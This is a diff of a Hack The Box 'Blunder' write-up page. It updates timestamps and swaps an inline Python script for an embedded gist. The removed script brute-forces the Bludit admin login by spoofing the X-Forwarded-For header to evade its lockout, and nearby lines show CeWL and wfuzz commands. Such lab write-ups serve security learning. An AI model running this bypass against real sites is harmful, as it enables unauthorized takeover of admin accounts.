@@ -20,7 +20,7 @@
     <meta property="og:url" content="inesmartins.github.io/htb-write-up-blunder/" />
     <meta property="og:image" content="inesmartins.github.io/content/images/2020/06/infocard.png" />
     <meta property="article:published_time" content="2020-10-22T08:50:44.000Z" />
-    <meta property="article:modified_time" content="2020-10-22T09:04:46.000Z" />
+    <meta property="article:modified_time" content="2021-09-15T09:32:53.000Z" />
     <meta property="article:tag" content="htb" />
     <meta property="article:tag" content="bludit" />
     <meta property="article:tag" content="cms" />
@@ -71,7 +71,7 @@
     "headline": "HTB Write-up  | Blunder",
     "url": "inesmartins.github.io/htb-write-up-blunder/",
     "datePublished": "2020-10-22T08:50:44.000Z",
-    "dateModified": "2020-10-22T09:04:46.000Z",
+    "dateModified": "2021-09-15T09:32:53.000Z",
     "image": {
         "@type": "ImageObject",
         "url": "inesmartins.github.io/content/images/2020/06/infocard.png",
@@ -288,50 +288,7 @@ Description:
   custom .htaccess file to bypass the file extension check to finally 
   get remote code execution.
 </code></pre>
-<!--kg-card-end: markdown--><p>We don't know the credentials but according to <a href="https://github.com/bludit/bludit/issues/1026">this open Github issue</a>, we do know that the username is <code>admin</code><strong> </strong>by default, which means we might be able to brute-force the password.</p><h3 id="bypassing-brute-force-protection">Bypassing Brute Force Protection</h3><p>When I tried to brute-force the password using <a href="https://portswigger.net/burp">Burp</a>, only the first request seemed to be processed correctly, the following requests all returned <code>301</code>. </p><p>After a bit of Googling, I realised this is caused by Bludit's "<a href="https://docs.bludit.com/en/security/brute-force-protection">Brute Force Protection</a>" feature, that's present on all versions after 3.9.2. </p><p>Luckily, some more Googling produced a very useful <a href="https://rastating.github.io/bludit-brute-force-mitigation-bypass/">article</a> that tells us how to bypass this mechanism. Turns out, the application determines the user's IP by trusting the <code>X-Forwarded-For</code> and <code>Client-IP</code> HTTP headers. Once Bludit detects more than x failed authentication requests (this number is configurable), it starts rejecting the authentication requests.</p><p>Since there's no validation that the IP is valid, we can simply pass the password as the <code>X-Forwarded-For</code> param, and then we can try to brute-force the passwords:</p><pre><code class="language-python">#!/usr/bin/env python3
-import re
-import requests
-
-host = 'http://blunder.htb'
-login_url = host + '/admin/login'
-username = 'admin'
-pwd_file = "wordlist.txt"
-
-# read passwords from file and adds them to wordlist array
-wordlist = []
-file = open(pwd_file, "r")
-for line in file: 
-    wordlist.append(line.strip())
-
-for password in wordlist:
-    session = requests.Session()
-    login_page = session.get(login_url)
-    csrf_token = re.search('input.+?name="tokenCSRF".+?value="(.+?)"', login_page.text).group(1)
-
-    print('[*] Trying: {p}'.format(p = password))
-
-    headers = {
-        'X-Forwarded-For': password,
-        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.90 Safari/537.36',
-        'Referer': login_url
-    }
-
-    data = {
-        'tokenCSRF': csrf_token,
-        'username': username,
-        'password': password,
-        'save': ''
-    }
-
-    login_result = session.post(login_url, headers = headers, data = data, allow_redirects = False)
-
-    if 'location' in login_result.headers:
-        if '/admin/dashboard' in login_result.headers['location']:
-            print()
-            print('SUCCESS: Password found!')
-            print('Use {u}:{p} to login.'.format(u = username, p = password))
-            print()
-            break</code></pre><p>None of the usual wordlists worked, so, following a tip from the <a href="https://forum.hackthebox.eu/discussion/3363/official-blunder-discussion/p9">Forum</a> I decided to create a custom wordlist from the website using <a href="https://tools.kali.org/password-attacks/cewl">CeWL</a>:</p><!--kg-card-begin: markdown--><pre><code>$ cewl -d 1 -m 5 -w blunder-wordlist.txt http://blunder.htb
+<!--kg-card-end: markdown--><p>We don't know the credentials but according to <a href="https://github.com/bludit/bludit/issues/1026">this open Github issue</a>, we do know that the username is <code>admin</code><strong> </strong>by default, which means we might be able to brute-force the password.</p><h3 id="bypassing-brute-force-protection">Bypassing Brute Force Protection</h3><p>When I tried to brute-force the password using <a href="https://portswigger.net/burp">Burp</a>, only the first request seemed to be processed correctly, the following requests all returned <code>301</code>. </p><p>After a bit of Googling, I realised this is caused by Bludit's "<a href="https://docs.bludit.com/en/security/brute-force-protection">Brute Force Protection</a>" feature, that's present on all versions after 3.9.2. </p><p>Luckily, some more Googling produced a very useful <a href="https://rastating.github.io/bludit-brute-force-mitigation-bypass/">article</a> that tells us how to bypass this mechanism. Turns out, the application determines the user's IP by trusting the <code>X-Forwarded-For</code> and <code>Client-IP</code> HTTP headers. Once Bludit detects more than x failed authentication requests (this number is configurable), it starts rejecting the authentication requests.</p><p>Since there's no validation that the IP is valid, we can simply pass the password as the <code>X-Forwarded-For</code> param, and then we can try to brute-force the passwords:</p><!--kg-card-begin: html--><script src="https://gist.github.com/inesmartins/4edeebfbf81f4bc660b9deab5ac98f16.js"></script><!--kg-card-end: html--><p>None of the usual wordlists worked, so, following a tip from the <a href="https://forum.hackthebox.eu/discussion/3363/official-blunder-discussion/p9">Forum</a> I decided to create a custom wordlist from the website using <a href="https://tools.kali.org/password-attacks/cewl">CeWL</a>:</p><!--kg-card-begin: markdown--><pre><code>$ cewl -d 1 -m 5 -w blunder-wordlist.txt http://blunder.htb
 </code></pre>
 <!--kg-card-end: markdown--><ul><li><code>-d</code> indicates the max scan depth;</li><li><code>-m</code> is the minimum word length;</li><li><code>-w</code> file where the wordlist will be written to.</li></ul><p>Unfortunately, this also failed, so I went back fuzzing.</p><hr><h3 id="fuzzing-for-credentials">Fuzzing for Credentials</h3><p>It took a while but I finally found something interesting:</p><!--kg-card-begin: markdown--><pre><code>$ wfuzz -w common.txt --hc 404 http://blunder.htb/FUZZ.txt
 ...
